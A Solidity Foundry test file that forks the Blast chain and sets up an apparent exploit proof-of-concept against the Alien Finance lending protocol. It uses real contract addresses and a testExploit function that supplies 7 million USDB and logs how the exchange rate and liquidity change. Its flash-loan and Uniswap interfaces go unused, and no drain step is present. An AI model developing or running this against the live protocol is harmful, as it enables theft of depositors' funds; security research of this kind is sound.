// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import {console, Test} from "forge-std/Test.sol";
import "./test/interfaces/IERC3156FlashBorrower.sol";
import "./test/interfaces/IERC20.sol";
import "./test/interfaces/IWETH.sol";

interface ILender {
    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
        external
        returns (bool);
}

interface IAToken {
    function balanceOf(address account) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function transferFrom(address from, address to, uint value) external returns (bool);
}

interface IAlienFinance {
    function supply(address from, address to, address market, uint256 amount) external;
    function borrow(address from, address to, address asset, uint256 amount) external;
    function redeem(address from, address to, address asset, uint256 amount) external;
    function repay(address from, address to, address asset, uint256 amount) external;
    function setUserExtension(address extension, bool allowed) external;
    function getUserAllowedExtensions(address user) external view returns (address[] memory);
    function getExchangeRate(address market) external view returns (uint256);
    function deferLiquidityCheck(address user, bytes memory data) external;
    function getCreditLimit(address user, address market) external view returns (uint256);

    function getBorrowBalance(address user, address market) external view returns (uint256);
    function getAccountLiquidity(address user) external view returns (uint256, uint256, uint256);
    function isUserLiquidatable(address user) external view returns (bool);
    function calculateLiquidationOpportunity(address marketBorrow, address marketCollateral, uint256 repayAmount) external view returns (uint256);
}

interface IDeferLiquidityCheck {
    function onDeferredLiquidityCheck(bytes memory data) external;
}

interface IUniswapExtension {
    struct Action {
        bytes32 name;
        bytes data;
    }

    struct UniV3SwapData {
        address caller;
        address swapOutAsset;
        address swapInAsset;
        bytes path;
        bytes32 subAction;
    }

    struct UniV2SwapData {
        address caller;
        address swapOutAsset;
        address swapInAsset;
        uint256[] amounts;
        address[] path;
        uint256 index;
        bytes32 subAction;
    }

    function execute(Action[] calldata actions) external payable;

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata _data) external;

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata _data) external;
}

contract AllienFlashTest is Test {
    using SafeMath for uint;
    IERC20 weth = IERC20(0x4300000000000000000000000000000000000004);
    IERC20 blast = IERC20(0xb1a5700fA2358173Fe465e6eA4Ff52E36e88E2ad);
    IERC20 usbd = IERC20(0x4300000000000000000000000000000000000003);
    ILender private lender = ILender(0x45cf520dB0598b8054796E3c772C46326fb19856);
    IAToken public usbdatoken = IAToken(0x6fF7A155557C4B516a062dFA65704b3158ea9ACf);
    address public attacker;
    IAlienFinance private Allien = IAlienFinance(0x02B7BF59e034529d90e2ae8F8d1699376Dd05ade);
    IUniswapExtension private uniExten = IUniswapExtension(0xE971563C790bCc9E7916ccEd72a2e84403b411B1);
    address private constant vict = 0xBe5b1aFae3D69E0B193E18ba75Ea27E45aF9D681;
    event log_named_bool(string key, bool value);

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/blast", 5561255);
        attacker = msg.sender;

        deal(address(usbd), address(this), 7_000_000 * 10**18);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Begin] Attacker usbd before supply", usbd.balanceOf(address(this)), 18);
        require(msg.sender == attacker, "Only attacker can start the exploit");

    uint256 exchangeRate = Allien.getExchangeRate(address(usbd));
    emit log_named_decimal_uint("exchangerate before supply exploit", exchangeRate, 18);

    // Supply the borrowed USDB
    uint256 balanceBeforeSupply = usbd.balanceOf(address(this));
    usbd.approve(address(Allien), balanceBeforeSupply);
    emit log_named_decimal_uint("USDB Balance Before Supply", balanceBeforeSupply, 18);

    Allien.supply(address(this), address(this), address(usbd), balanceBeforeSupply);

    uint256 usbdtoken = usbdatoken.balanceOf(address(this));
    emit log_named_decimal_uint("usbdatoken balance after suply", usbdtoken, 18);

    uint256 otherexchangeRate = Allien.getExchangeRate(address(usbd));
    emit log_named_decimal_uint("exchangerate after supply exploit", otherexchangeRate, 18);

    (uint256 collateralValue, uint256 liquidationCollateralValue, uint256 debtValue) = Allien.getAccountLiquidity(address(this));
    emit log_named_decimal_uint("Collateral Value", collateralValue, 18);
    emit log_named_decimal_uint("Liquidation Collateral Value", liquidationCollateralValue, 18);
    emit log_named_decimal_uint("Debt Value", debtValue, 18);

    uint256 balanceAfterSupply = usbd.balanceOf(address(this));
    emit log_named_decimal_uint("[End] Attacker usbd after exploit", balanceAfterSupply, 18);

    }

    receive() external payable {}

    // function deal(address token, address to, uint256 amount) internal {
    //     bytes memory payload = abi.encodeWithSignature("deal(address,address,uint256)", token, to, amount);
    //     (bool success, ) = address(this).call(payload);
    //     require(success, "Deal failed");
    // }
}
